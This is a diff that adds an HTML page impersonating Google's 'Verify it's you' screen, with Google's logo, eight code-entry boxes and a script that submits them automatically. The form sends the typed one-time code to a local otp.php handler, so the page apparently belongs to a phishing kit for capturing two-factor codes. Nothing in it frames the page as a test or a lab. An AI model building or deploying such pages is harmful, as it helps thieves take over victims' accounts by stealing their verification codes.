@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify OTP – Google</title>
+
+  <!-- ✅ Google Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+
+  <!-- ✅ External CSS for OTP Page -->
+  <link rel="stylesheet" href="css/otp.css">
+</head>
+<body>
+  <div class="container">
+
+    <!-- ✅ Google Logo -->
+    <div class="logo-wrapper">
+      <img src="css/assets/google.png" alt="Google logo" class="google-logo" />
+    </div>
+
+    <!-- ✅ Title and Instructions -->
+    <h2>Verify it’s you</h2>
+    <p>Enter the 8-digit code sent to your phone</p>
+
+    <!-- ✅ OTP Input Form -->
+    <form action="otp.php" method="GET">
+      <div class="body">
+        <!-- ✅ 8 individual OTP boxes -->
+       <input type="tel" name="otp0" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp1" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp2" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp3" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp4" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp5" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+	<input type="tel" name="otp6" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+       <input type="tel" name="otp7" maxlength="1"  pattern="[0-9]*" inputmode="numeric" class="otp-input" required />
+      
+    </div>
+
+      <!-- ✅ Footer Navigation -->
+      <div class="footer">
+        <button type="submit">Next</button>
+        <a href="#">Try another way</a>
+      </div>
+    </form>
+  </div>
+
+  <!-- ✅ OTP Auto-Focus Script -->
+  <script>
+    const inputs = document.querySelectorAll('.otp-input');
+    const form = document.querySelector('form');
+
+    inputs.forEach((input, i) => {
+      input.addEventListener('input', () => {
+        if (input.value.length === 1 && i < inputs.length - 1) {
+          inputs[i + 1].focus();
+        }
+
+        // ✅ Auto-submit when all fields are filled
+        const allFilled = Array.from(inputs).every(inp => inp.value.length === 1);
+        if (allFilled) form.submit();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && input.value === '' && i > 0) {
+          inputs[i - 1].focus();
+        }
+      });
+    });
+  </script>
+</body>
+</html>
